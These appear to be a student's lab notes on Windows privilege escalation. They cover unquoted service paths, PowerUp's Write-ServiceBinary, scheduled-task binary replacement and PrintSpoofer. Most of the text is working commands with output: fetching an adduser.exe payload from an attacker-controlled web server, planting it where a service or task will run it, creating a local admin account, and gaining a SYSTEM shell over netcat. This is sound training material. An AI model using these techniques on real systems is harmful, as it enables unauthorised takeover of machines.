PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
daveadmin                DefaultAccount           Guest
offsec                   steve                    WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve\Documents> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...
WARNING: Waiting for service 'BetaService (BetaService)' to start...

PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve\Documents> net localgroup administrators
...
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```

### Unquoted Service Paths

We can use an Unquoted Service Path attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them. If a Windows service is mapped to an executable that has a space and is not enclosed in quotes, we can leverage it.

When services are started and processes are created for them, the Windows CreateProcess function is used, which has a first parameter of "IpApplicationName" that specifies the name and, optionally, the path to the exe. If the string provided has spaces and is unquoted, it is unclear to the function where the file name ends and the args begin. For every space in a file path, the funcntion uses the preceding part as file name by adding .exe and the rest as args. 

Imaginve we have C:\Program Files\My Program\My Service\service.exe. Windows tries to start the executable service in this order:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

We need to create a malicious exe, put it in the dir that corresponds to one of the interpreted paths, and match its name to the interpreted filename. Our file will get executed with the same privs as the service, once the service is started. This is often a LocalSystem account.

Example: We could name our malicious exe Program.exe and put it in C:\, My.exe and put it in C:\Program Files\, or My.exe and put it in C:\Program Files\My Program\. The first two options require some unlikley perms because standard users can't usually write to these dirs. The third is most feasible since it is is the software's main dir.  If the dev set the perms for this dir too open, we can put our binary there.

```console
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName 

Name                      State   PathName
----                      -----   --------
...
GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
...
```

We found an unquoted service path with spaces. We could do this easier in cmd.exe with wmic:

```console
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Name                                       PathName                                                                     
...                                                                                                         
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Check if you have perms to start and stop the service.

```console
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```

Determine the order Windows will check for the exe of the service:

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Check your access rights to these files:

```console
PS C:\Users\steve> icacls "C:\"
C:\ BUILTIN\Administrators:(OI)(CI)(F)
    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
    
Successfully processed 1 files; Failed processing 0 files
    
PS C:\Users\steve>icacls "C:\Program Files"
C:\Program Files NT SERVICE\TrustedInstaller:(F)
                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                 NT AUTHORITY\SYSTEM:(M)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                 BUILTIN\Administrators:(M)
                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
                 BUILTIN\Users:(RX)
                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
                 CREATOR OWNER:(OI)(CI)(IO)(F)
...

Successfully processed 1 files; Failed processing 0 files

PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W)
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Built-in Users has write permissions to the third path. Put your malicious file name "Current.exe" here.

We'll reuse our adduser.exe from our running python3 webserver.

```console
PS C:\Users\steve> iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe

PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

Start the service and check the result.

```console
PS C:\Users\steve> Start-Service GammaService
Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
service GammaService on computer '.'.
At line:1 char:1
+ Start-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
    
PS C:\Users\steve> net user

Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```

Even though the service can't start, the executable is still runs our payload.

To restore the original service, just stop the service, delete our binary, and start the service again.

PowerUp may also be able to help.

```console
PS C:\Users\dave> iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

PS C:\Users\dave> powershell -ep bypass
...

PS C:\Users\dave> . .\PowerUp.ps1

PS C:\Users\dave> Get-UnquotedService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
```

Try to use the AbuseFucntion that will create a new local user called john with the password Password123! and add john to the local Administrators group.

```console
PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

ServiceName  Path                                         Command
-----------  ----                                         -------
GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...

PS C:\Users\steve> Restart-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...
Restart-Service : Failed to start service 'GammaService (GammaService)'.
At line:1 char:1
+ Restart-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
   , ServiceCommandException
    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand

PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    john            offsec
steve                    WDAGUtilityAccount

The command completed successfully.

PS C:\Users\steve> net localgroup administrators
...
john
...
```

## Abusing Other Windows Components

### Scheduled Tasks

Task Scheduler automates things like cleam-ups or update management. Tasks have one or more triggers, such us a time and date, at log on, or on a Windows event. The configs of a task can be found in the Conditions, Settings, and General menu tabs of the task's property.

We need to know 3 things to identify if privilege escalation is possible through a scheduled task:
- User account (principal) that executes the task - If a task is run as NT AUTHORITY/SYSTEM or as an admin user, we can get privilege escalation.
- Triggers specified for the task - If a trigger was met in the past, the task will not run again in the future, or if the time trigger occurs after the deadline for our pentest (you should still mention this finding in your report)
- Actions executed when one or more of the triggers are met - in most cases, we can use familiar tactics like replacing the binary or placing a missing DLL. We don't have a service binary for scheduled tasks, but we have programs and scripts specified by the actions.

With the following two commands, look for interesting information in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields that answer one of the three items above.

```console
PS C:\Users\steve> Get-ScheduledTask
PS C:\Users\steve> schtasks /query /fo LIST /v
...
Folder: \Microsoft
HostName:                             CLIENTWK220
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        7/11/2022 2:47:21 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/11/2022 2:46:22 AM
Last Result:                          0
Author:                               CLIENTWK220\daveadmin
Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\steve\Pictures
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          daveadmin
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           7:37:21 AM
Start Date:                           7/4/2022
...
```

We found one authored by daveadmin that runs every minute as daveadmin. We have extensive permissions to leverage this since the exe is located in a subdir of steve's home dir. 

```console
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

Use the adduser.exe binary to replace the file.

```console
PS C:\Users\steve> iwr -Uri http://192.168.45.245/adduser.exe -Outfile BackendCacheCleanup.exe

PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak

PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
```

Let the scheduled task execute again, and check if we achieved privilege escalation.

```console
PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```

### Using Exploits

We will use three different types of exploits for privilege escalation:
- Application-based vulnerabilities - installed apps can contain vulns as seen in "Locating Public Exploits". If the apps run with admin privs AND we are able to exploit a vuln that leads to code execution, we can elevate our privileges.
- Windows Kernel Vulnerabilities - These are quite advanced, but exist and can be used for privilege escalation. These exploits can crash systems, so always have a good understanding of boundaries.
- Windows Privilege abuse - Non-privileged users that have assigned privileges, like SeImpersonatePrivilege, can abuse those privileges. SeImpersonatePrivilege may let us leverage a token with another security context. A user with this privilege can perform ops in the security context of another user under the right circumstances. Windows default-assigns this privilege to the local Administrtors group, LOCAL SERVICE, NETWORK SERVICE, and SERVICE accounts. Other privileges that we can leverage for priv escalation include SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug.

We'll often come across the SeImpersonatePrivilege when we gain code execution on a Win system by exploiting a vuln in an Internet Information Service (IIS) web server. Most configs of IIS run as LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity. All of these, as well as other Windows services, have the SeImpersonatePrivilege. 

Named pipes are one method for local or remote Inter-Process Communication and allow two unrelated processes to share and transfer data with each other. A named pipe server can create a named pipe to which a named pipe client can connect via the specified name. The client and server can be on different systems. When a client connects to a named pipe, the server can leverage the SeImpersonatePrivilege to impersonate the client after capturing the authentication from their connection process.

We need to find a privileged process and coerce it into connecting to a controlled named pipe. Once we impersonate the user connecting to the named pipe, we can operate with their privileges.

Let's try PrintSpoofer to implement the printer bug and coerce NT Authority\SYSTEM into connecting to a controlled named pipe. We'll use this tool when we have code execution as a user with the SeImpersonatePrivilege to execute commands as NT AUTHORITY\SYSTEM.

```console
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dave> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

// second terminal 

kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
...
2022-07-07 03:48:45 (16.6 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

// first terminal

C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.45.245/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe

PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

PrintSpoofer was an easy exploit. There are also tools like variants from the [Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) family (RottenPotato, SweetPotato, JuicyPotato) that are an effective alternative to PrintSpoofer.
